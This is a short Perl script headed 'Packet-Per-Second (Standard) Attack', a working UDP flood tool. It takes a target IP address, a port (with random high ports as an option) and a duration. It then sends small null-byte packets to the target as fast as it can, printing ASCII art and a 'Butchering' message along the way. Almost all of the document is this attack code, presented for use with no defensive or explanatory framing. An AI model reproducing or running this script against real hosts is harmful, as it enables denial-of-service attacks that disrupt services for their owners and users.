#!/usr/bin/perl
# Packet-Per-Second (Standard) Attack

use Socket;
use strict;

if (@ARGV != 3) {
    die "\r\n\tUsage: perl $0 <ip> <port|0=random> <time>\r\n\r\n";
}

my ($ip,$port,$time) = @ARGV;

my $iaddr = inet_aton("$ip")
    or die "\r\n\tResolution error.\r\n";

if ($port != 0) {
    $port = 80 if $port < 1 || $port > 65535;
}

$time = 30 if $time < 5 || $time > 3600;

socket(pps, PF_INET, SOCK_DGRAM, 17);

print "\r\n" x 20;

print <<'EOF';
.............. MMM......................
..  ..  ..... . MMN...  ..  ..  ..  .. .
         .MMM7..~MM. ......            .
      .., MMMMMMMMMM..MMMM.            .
.......NMMM,.MMMMMMMMMMN .........b.....
........MMMMMMMMMMMMMM. .......,ZMMM....
.........~MMMMMMMMMMMMM .....?MMMMMMMD..
    .,MMMMMMMMMMMMMMMM~.. .:MMMMMMMMMM. 
..  .., .MMMMMMMMMMMMMMM... MMMMMMMMMMN 
  ..ZMM7NMMMMMMMMMMMMMD.  ... MMMMMMMMM=
........MMMMMMMMMMMMMM .......MMMMMMMMMM
  .. ..MMMMMMMMMMMMMMMI   ...MMMMMMMMMMZ
     .=DMM.MMMMMMMMMMMMM   ..MMMMMMM ...
      .. .+M. .MMMMMMMMM.   .  ,MMMM,  .
      ..:::.. .MMMM    .     .,MMMMMM  .
    .MMMMMMMMMMMMMMMMM7...IMMMMMMMMMM...
     MMMM$   . MMMMMMMMMMMMMMMMMMMMMM. .
    .MMMM     .MMMMMMMMMMMMMMMM,..MM.  .
   .MMMMM.   . MMMMMMMMMMMMNZ.         .
   MMMMMMM    .MMMMMMMM      ... .     .
   MMMMMM .    8MMMMMMM,. ..ZMMMMM..   .
    ,DMM.      .MMMMMMMMMMMMMMMMMM.    .
               .MMMMMMMMMMMMMMMMMM.    .
                =MMMMMMMMMMMIMMMM.     .
               .:MMMMZ.   .8MMM        .
    ... .    ..OMMMM.   ..MMMMM...     .
   .MMMMM. ...MMMMM.  ...MMMMMMMMMM.....
 .NNMMMMMMMMMMMMMM .    ,MMMMMMMMMMM.  .
.MMMMMMMMMMMMMMMM.        .  ?NMMMN..  .
MMMMMM,. $MMMMM8.                      .
MMMM,.    .MM7                         .
D~..                                   .
EOF

my $d_port = $port;

my $data = "\x00" x 18;

my $quit = time() + $time;

print "\r\nButchering " . $ip . " for " . $time . " seconds. CTRL+C to abort...\r\n";

for (;time() <= $quit;) {

    if ($port == 0) {
        $d_port = int(rand(65500 - 30000 + 1)) + 30000;
    }

    my $d_addr = sockaddr_in($d_port, $iaddr);

    send(pps, $data, 0, $d_addr);
}

print "\r\nDone.\r\n\r\n";
exit(0);
